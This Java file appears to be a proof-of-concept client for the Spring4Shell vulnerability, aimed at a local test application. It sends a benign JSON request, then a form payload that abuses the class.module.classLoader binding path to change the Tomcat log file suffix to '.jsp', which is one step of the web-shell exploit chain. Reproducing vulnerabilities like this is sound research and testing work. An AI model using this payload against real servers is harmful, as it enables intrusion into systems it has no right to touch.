package com.github.marschall.spring4shell.client;

import java.net.URI;
import java.util.List;

import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.RequestEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

public class Spring4ShellClient {

  public static void main(String[] args) {
    String host = "http://localhost:8080/";
    String context = "spring4shell";
//    String context = "spring4shell-war-0.1.0-SNAPSHOT";
    String servlet = "poc";
    String endpoint = "model";
    URI baseUri = URI.create(host + context + "/" + servlet + "/" + endpoint);
    RestTemplate restTemplate = new RestTemplate();

    RequestEntity<String> jsonEntity = newJsonEntity(baseUri);
    ResponseEntity<String> jsonResponse = restTemplate.exchange(jsonEntity, String.class);
    System.out.println(jsonResponse.getStatusCodeValue());
    System.out.println(jsonResponse.getBody());

    RequestEntity<String> payloadEntity = newPayloadEntity(baseUri);
    ResponseEntity<Void> payloadResponse = restTemplate.exchange(payloadEntity, Void.class);
    System.out.println(payloadResponse.getStatusCodeValue());
  }

  private static RequestEntity<String> newJsonEntity(URI baseUri) {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_JSON);
    httpHeaders.setAccept(List.of(MediaType.TEXT_PLAIN));
    return new RequestEntity<>("{\"name\": \"safe\"}", httpHeaders, HttpMethod.POST, baseUri);
  }

  private static RequestEntity<String> newPayloadEntity(URI baseUri) {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
    httpHeaders.add("c2", "sp");
    String payload = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.j%25%7Bc2%7Di"; // .j%{c2}i -> .jsp
    return new RequestEntity<>(payload, httpHeaders, HttpMethod.POST, baseUri);
  }

}
